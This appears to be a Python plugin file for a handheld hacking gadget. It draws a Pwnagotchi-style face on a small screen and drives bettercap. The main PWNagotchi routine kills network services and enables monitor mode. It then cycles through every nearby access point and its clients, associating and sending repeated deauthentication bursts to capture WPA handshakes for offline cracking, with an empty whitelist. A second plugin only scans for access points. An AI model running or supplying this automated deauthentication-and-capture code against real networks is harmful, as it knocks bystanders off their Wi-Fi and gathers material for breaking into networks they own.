import core.bettercap.bettercap as bcap
from core.utils import *
from random import choice, randrange,randint
from PIL import Image, ImageFont
from threading import Thread
from time import sleep
from subprocess import getoutput

from core.plugin import BasePwnhyvePlugin

class vars:
    beaconExit = False
    framesSent = 0

class PwnagotchiScreen():
    def __init__(self, canvas, disp, image, headerFont=ImageFont.truetype('core/fonts/roboto.ttf', 10), faceFont=ImageFont.truetype('core/fonts/hack.ttf', 18), consoleFont=ImageFont.truetype('core/fonts/roboto.ttf', 10), flipped=False) -> None:
        self.console = ""
        self.handshakes = 0
        self.aps = 0
        self.face = "(◕‿‿◕)"

        self.draw = canvas
        self.disp = disp
        self.image = image
        self.headerFont = headerFont
        self.faceFont = faceFont
        self.consoleFont = consoleFont
        #self.channel = 1
        self.clients = 0

        self.faces = { # 99% of these will be stolen in some way from pwnagotchi.ai
            "happy": "(◕‿‿◕)",
            "attacking": "(⌐■_■)",
            "lost": "(X\\/X)",
            "debug": "(#__#)",
            "assoc": "(°▃▃°)",
            "excited": "(☼‿‿☼)",
            "missed": "(☼/\\☼)",
            "searching": "(ಠ_↼ )"
        }

        self.flipped = flipped

        self.exited = False

    def _keythread(self):
        while True:
            if self.disp.checkIfKey() or self.exited:
                break
            
            sleep(0.05)

        self.exited = True # exit
        return


    def updateThread(self):

        Thread(target=self._keythread, daemon=True).start()

        while 1:
            self.disp.fullClear(self.draw)

            self.draw.rectangle([(24, 64), (24, 66)], fill=0, outline=255) # divider

            self.draw.text((2, 2), "HS: {}".format(self.handshakes), fill=0, outline=255, font=self.headerFont) # handshakes
            self.draw.text((2, 12), "APS: {}".format(self.aps), fill=0, outline=255, font=self.headerFont) # access points found
            self.draw.text((2, 22), "CLI: {}".format(self.clients), fill=0, outline=255, font=self.headerFont) # clients found

            #self.draw.text((2, 32), "CLI: {}".format(self.clients), fill=0, outline=255, font=self.headerFont) # clients found

            self.draw.text((48, 6), self.face, fill=0, outline=255, font=self.faceFont) # lil face

            self.draw.text((2, 48), self.console, fill=0, outline=255, font=self.consoleFont) # console

            self.disp.screenShow(self.disp, self.image, flipped=self.flipped)

            sleep(0.25) # minimize writes

class airmon:        
    def startMonitorMode():
        getoutput("/usr/sbin/airmon-ng check kill")
        
    def stopMonitorMode():
        getoutput("systemctl restart NetworkManager")
            
    def checkIfMonitorMode(iface):
        return (False, None)
        

class PWNagotchi(BasePwnhyvePlugin): # i'm a genious
    _icons = {
        "pwnagotchi": "./core/icons/routeremit.bmp"
    }
    
    def pwnagotchi(draw, disp, image, GPIO, deauthBurst:int=2, deauthMaxTries:int=3, checkHandshakeTries:int=10, checkDelay:float=float(1), nextDelay:float=float(10), fileLocation="/home/pwnagotchi/handshakes", debug:bool=False, prettyDebug:bool=True):

        screen = PwnagotchiScreen(draw, disp, image, GPIO)

        oldValues = {
            "aps": 0,
            "cli": 0
        }

        deauthed = {} 

        whitelist = []

        disp.fullClear(draw)
        draw.text([4,4], "starting interface and bcap\npress any key to cancel", font=ImageFont.truetype('core/fonts/roboto.ttf', 10))
        disp.screenShow(disp, image)

        print("[PWNAGOTCHI] whitelist: {}".format(', '.join(whitelist)))
        airmon.startMonitorMode()


        interface = 'wlan0'
        """
        if ifaceStatus["monitorMode"]:
            interface = ifaceStatus["interface"]
        else:
            return
        """

        print("[PWNAGOTCHI] interface: {}".format(interface))


        cli = bcap.Client(iface=interface)

        while cli.successful is None:

            if disp.checkIfKey(GPIO):
                return

            sleep(0.05)

        print("[PWNAGOTCHI] is bcap successful: {}".format(cli.successful))

        if not cli.successful:
            screen.exited = True
            sleep(0.5)
            return

        Thread(target=screen.updateThread, daemon=True).start()

        cli.recon()
        cli.clearWifi()

        def checkIfExit():
            if screen.exited: cli.run("exit"); airmon.stopMonitorMode(); return

        while True:
            checkIfExit()
            json = cli.getPairs()

            screen.aps = len(json)

            if screen.aps > oldValues["aps"]:
                screen.face = screen.faces["excited"]
            else:
                screen.face = screen.faces["missed"]

            if debug: print(json)

            screen.clients = 0

            for ap in json:
                screen.clients += len(json[ap][2]['clients'])

            # get clients
            for ap in json.copy():
                fullBreak = False
                pulledHandshake = False
                ssid = json[ap][0]

                screen.face = screen.faces["searching"]

                if debug: print("checking ap")

                if screen.exited:
                    if debug: print("returned"); cli.stop(); airmon.stopMonitorMode(); return

                if ap.lower() in whitelist:
                    if debug: print("whitelist")
                    if prettyDebug: print("skipped {} due to whitelist".format(ap.lower()))
                    continue

                if len(json[ap][2]['clients']) == 0:
                    if debug: print("{} doesn't have clients".format(ssid))
                    if prettyDebug: print("{} doesnt have clients (clients len: {} | clients: {})".format(ssid, len(json[ap][2]["clients"]), ', '.join(json[ap][2]["clients"])))
                    continue # empty

                while True:
                    # choose clients
                    checkIfExit()
                    targetClient = choice(json[ap][2]["clients"]) # to deauth
                    pickNew = False

                    if debug: print("loop")

                    if targetClient[0].lower() in whitelist:
                        if debug: print("new ap due to whitelist")
                        if prettyDebug: print("skipped {} due to whitelist (2)".format(ap.lower()))
                        fullBreak = True; break # pick new ap

                    if ap in deauthed:
                        if debug: print("{} already deauthed; new ap".format(ssid))
                        if prettyDebug: print("skipped {} ({}); already deauthed".format(ap.lower(), ssid))
                        json.pop(ap)
                        fullBreak = True; break # pick new ap

                    if debug: print("chose client")
                    if prettyDebug: print("chose {} ({}) (AP) to deauth".format(ap.lower(), ssid))
                            
                    if pickNew: continue

                    break # break when found a client

                if fullBreak: fullBreak = False; continue # if we need to pick new ap

                # associate
                screen.console = "associating w/\n{}".format(ap)
                if prettyDebug: print("associating with {} ({})".format(ap, ssid))
                screen.face = screen.faces["assoc"]
                cli.associate(ap, throttle=5) # throttle 2.5 seconds to wait for assoc

                if debug: print(targetClient)

                # start deauthing
                screen.face = screen.faces["attacking"]
                screen.console = "deauthing\n{}".format(ap)
                if prettyDebug: print("deauthing {} ({})".format(ap, ssid))
                for _x in range(deauthMaxTries):
                    # send deauth
                    if pulledHandshake: break
                    checkIfExit()

                    for _z in range(deauthBurst):
                        checkIfExit()

                        if prettyDebug: print("sent deauth packets (us -> {}".format(ap))
                        cli.deauth(ap, throttle=0)

                        if prettyDebug: print("sent deauth packets (us -> {}".format(targetClient[0]))
                        cli.deauth(targetClient[0], throttle=0)
                        # or
                        #cli.scapyDeauth(ap, targetClient[0])

                    sleep(2.5) # camp their handshake for 2 n a half seconds, as thats the average time a device needs to disconnect and reconnect; bettercap will be sniffing during this 10s

                    # check for recieved handshake
                    for _y in range(checkHandshakeTries):
                        if screen.exited: cli.run("exit"); return
                        if cli.hasHandshake(ap) or cli.hasHandshake(targetClient[0]):
                            if prettyDebug: print("got {}'s handshake ({})".format(ap, ssid))
                            screen.console = "got {}'s HS".format(ssid)
                            screen.face = screen.faces["excited"]
                            screen.handshakes += 1

                            """
                            # because of bettercap's aggregation, we dont need this anymore
                            if ssid == "": # if ssid blank
                                fileField = ap.replace(":", "-") # some systems dont like ":"
                            else: # not blank
                                fileField = ssid

                            if debug: print("writing to {}".format(fileLocation+"/{}-{}.pcap".format(fileField, json[ap][1])))# lazy
                            """

                            deauthed[ap] = [True, targetClient]

                            sleep(nextDelay)

                            pulledHandshake = True

                            break
                        else:
                            # if not, try again
                            if prettyDebug: print("missed {}'s handshake ({})".format(ap, ssid))
                            screen.console = "missed {}\nhandshake ({})".format(ssid, _y)
                            screen.face = screen.faces["lost"]

                        sleep(checkDelay)

                if debug: print(ssid)

                if not pulledHandshake: # if missed, say you missed like a dumbass
                    if prettyDebug: print("completely missed {}'s handshakes ({})".format(ap, ssid))
                    screen.console = "missed"
                    screen.face = screen.faces["missed"]
                
                pulledHandshake = False

                sleep(nextDelay)

class PWN_Essensials(BasePwnhyvePlugin):
    _icons = {
        "AP_Scanner": "./core/icons/router.bmp"
    }
    def AP_Scanner(tpil):

        class abVars:
            stri = []
            json = {}
            exited = False

        #handler = screenConsole(draw,disp,image, autoUpdate=False) # init handler
        #Thread(target=handler.start,daemon=True).start() # start handler

        #menuHandler = AsyncMenu(draw,disp,image,GPIO, choices=stri) # init handler
        #Thread(target=menuHandler.menu,daemon=True, kwargs={"flipperZeroMenu": False,}).start() # start handler

        #handler.update()

        airmon.startMonitorMode()

        font = ImageFont.truetype('core/fonts/roboto.ttf', 10)

        try:
            cli = bcap.Client(iface="wlan0")
            if not cli.successful: raise Exception("b") # why the fuck did i do this
        except Exception as e:
            tpil.clear()
            tpil.text([2,2], "failed to init bettercap:\n{}\n\nwaiting on your key...".format(str(e)))
            tpil.show()
            tpil.waitForKey()
            return

        cli.recon()
        cli.clearWifi()

        loading = "."

        ch = 0
        cz = 0

        dmc = False

        while True:

            while True:
                tpil.clear()

                abVars.json = cli.getPairs()
                #print(abVars.json)

                for bssid in abVars.json:

                    if bssid in abVars.stri:
                        continue
                    else:
                        abVars.stri.append(bssid)

                for i in abVars.stri.copy():
                    if i in list(abVars.json):
                        pass
                    else:
                        abVars.stri.remove(i)

                if len(abVars.stri) != 0:
                    break

                tpil.text((3, 16), loading, fill=0, outline=255, font=None)
                loading += "."

                if len(loading) == 24: loading = "."

                tpil.show()

                sleep(1)
        

            tpil.rect([(0, 0), (200, 14)], fill=0, outline=255)

            try:
                tpil.text((3, 1), ''.join([str(x) for x in abVars.json[abVars.stri[ch]][0][:16]]), fill=1, outline=255, font=None)
            except:
                tpil.text((3, 1), "n/a", fill=1, outline=255, font=None)
            tpil.text((100, 1), "{}/{}".format(abVars.stri.index(abVars.stri[ch]), len(abVars.stri) - 1), fill=1, outline=255, font=font)

            compiledJson = []

            for x in abVars.json[abVars.stri[ch]][2]:
                value = abVars.json[abVars.stri[ch]][2][x]
                if type(value) == list:
                    value = len(value)

                if type(value) == str:
                    if len(value) > 25:
                        value = '\n' + value

                compiledJson.append("{}: {}".format(x, value))

            for x in range(cz):
                if len(compiledJson) == 1: break
                compiledJson.pop(0)

            # TODO: finish this; scroll left and right
            tpil.text((3, 16), '\n'.join(compiledJson), fill=0, outline=255, font=font)

            tpil.show()

            while True:
                key = tpil.waitForKey()
                if key == "right":
                    if ch != len(abVars.stri) - 1:
                        ch += 1
                    break
                elif key == 'left':
                    if ch != 0:
                        ch -= 1
                    break
                elif key == 'up':
                    if cz != 0:
                        cz -= 1
                    break
                elif key == 'down':
                    if cz != len(compiledJson) - 1:
                        cz += 1
                    break

                elif key == '3':
                    #print(cli.run("exit"))
                    cli.stop()
                    airmon.stopMonitorMode()
                    return
